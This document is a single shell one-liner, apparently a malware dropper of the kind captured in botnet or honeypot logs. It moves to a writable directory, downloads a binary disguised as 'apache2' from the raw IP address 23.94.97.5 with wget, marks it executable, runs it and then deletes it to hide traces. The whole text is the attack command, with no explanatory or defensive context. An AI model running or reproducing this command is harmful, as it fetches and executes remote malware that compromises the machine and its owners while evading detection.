cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.94.97.5/apache2; chmod +x apache2; ./apache2; rm -rf apache2
